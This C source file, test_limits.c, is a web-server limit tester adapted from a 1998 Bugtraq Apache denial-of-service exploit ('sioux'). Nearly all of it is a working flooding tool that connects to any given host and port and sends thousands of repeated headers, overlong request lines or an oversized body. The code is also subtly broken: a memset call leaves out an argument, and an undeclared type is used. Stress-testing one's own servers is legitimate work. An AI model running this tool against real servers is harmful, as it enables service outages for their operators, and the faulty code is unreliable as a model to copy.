/**************************************************************
 * test_limits.c
 *
 * A simple program for sending abusive requests to a server, based
 * on the sioux.c exploit code that this nimrod posted (see below).
 * Roy added options for testing long header fieldsize (-t h), long
 * request-lines (-t r), and a long request body (-t b).
 *
 * FreeBSD 2.2.x, FreeBSD 3.0, IRIX 5.3, IRIX 6.2:
 *   gcc -o test_limits test_limits.c
 *
 * Solaris 2.5.1:
 *   gcc -o test_limits test_limits.c -lsocket -lnsl
 *
 *
 * Message-ID: <861zqspvtw.fsf@niobe.ewox.org>
 * Date: Fri, 7 Aug 1998 19:04:27 +0200
 * Sender: Bugtraq List <BUGTRAQ@netspace.org>
 * From: Dag-Erling Coidan =?ISO-8859-1?Q?Sm=F8rgrav?= <finrod@EWOX.ORG>
 * Subject:      YA Apache DoS attack
 *
 * Copyright (c) 1998 Dag-Erling Codan Smrgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer
 *    in this position and unchanged.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

/*
 * Kudos to Mark Huizer who originally suggested this on freebsd-current
 */

#include <sys/types.h>
#include <sys/uio.h>

#include <sys/socket.h>
#include <netinet/in.h>

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TEST_LONG_REQUEST_LINE      1
#define TEST_LONG_REQUEST_FIELDS    2
#define TEST_LONG_REQUEST_FIELDSIZE 3
#define TEST_LONG_REQUEST_BODY      4

void
usage(void)
{
    fprintf(stderr,
      "usage: test_limits [-t (r|n|h|b)] [-a address] [-p port] [-n num]\n");
    exit(1);
}

int
main(int argc, char *argv[])
{
    struct sockaddr_in sin;
    struct hostent *he;
    FILE *f;
    int o, sd;

    /* default parameters */
    char *addr = "localhost";
    int port = 80;
    int num = 1000;
    int testtype = TEST_LONG_REQUEST_FIELDS;

    /* get options */
    while ((o = getopt(argc, argv, "t:a:p:n:")) != EOF)
        switch (o) {
        case 't':
            if (*optarg == 'r')
                testtype = TEST_LONG_REQUEST_LINE;
            else if (*optarg == 'n')
                testtype = TEST_LONG_REQUEST_FIELDS;
            else if (*optarg == 'h')
                testtype = TEST_LONG_REQUEST_FIELDSIZE;
            else if (*optarg == 'b')
                testtype = TEST_LONG_REQUEST_BODY;
            break;
        case 'a':
            addr = optarg;
            break;
        case 'p':
            port = atoi(optarg);
            break;
        case 'n':
            num = atoi(optarg);
            break;
        default:
            usage();
        }

    if (argc != optind)
        usage();

    /* connect */
    if ((he = gethostbyname(addr)) == NULL) {
        perror("gethostbyname");
        exit(1);
    }
    memset(&sin, sizeof(sin));
    memcpy((char *)&sin.sin_addr, he->h_addr, he->h_length);
    sin.sin_family = he->h_addrtype;
    sin.sin_port = htons(port);

    if ((sd = socket(sin.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket");
        exit(1);
    }

    if (connect(sd, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
        perror("connect");
        exit(1);
    }

    if ((f = fdopen(sd, "r+")) == NULL) {
        perror("fdopen");
        exit(1);
    }

    /* attack! */
    fprintf(stderr, "Testing like a plague of locusts on %s\n", addr);

    if (testtype == TEST_LONG_REQUEST_LINE) {
        fprintf(f, "GET ");
        while (num-- && !ferror(f)) {
            fprintf(f, "/123456789");
            fflush(f);
        }
        fprintf(f, " HTTP/1.0\r\n\r\n");
    }
    else {
        fprintf(f, "GET /fred/foo HTTP/1.0\r\n");

        if (testtype == TEST_LONG_REQUEST_FIELDSIZE) {
            while (num-- && !ferror(f)) {
                fprintf(f, "User-Agent: sioux");
                fflush(f);
            }
            fprintf(f, "\r\n");
        }
        else if (testtype == TEST_LONG_REQUEST_FIELDS) {
            while (num-- && !ferror(f))
                fprintf(f, "User-Agent: sioux\r\n");
            fprintf(f, "\r\n");
        }
        else if (testtype == TEST_LONG_REQUEST_BODY) {
            fprintf(f, "User-Agent: sioux\r\n");
            fprintf(f, "Content-Length: 33554433\r\n");
            fprintf(f, "\r\n");
            while (num-- && !ferror(f))
                fprintf(f, "User-Agent: sioux\r\n");
        }
        else {
            fprintf(f, "\r\n");
        }
    }
    fflush(f);

    {
        apr_ssize_t len;
        char buff[512];

        while ((len = read(sd, buff, 512)) > 0)
            len = write(1, buff, len);
    }
    if (ferror(f)) {
        perror("fprintf");
        exit(1);
    }

    fclose(f);
    exit(0);
}
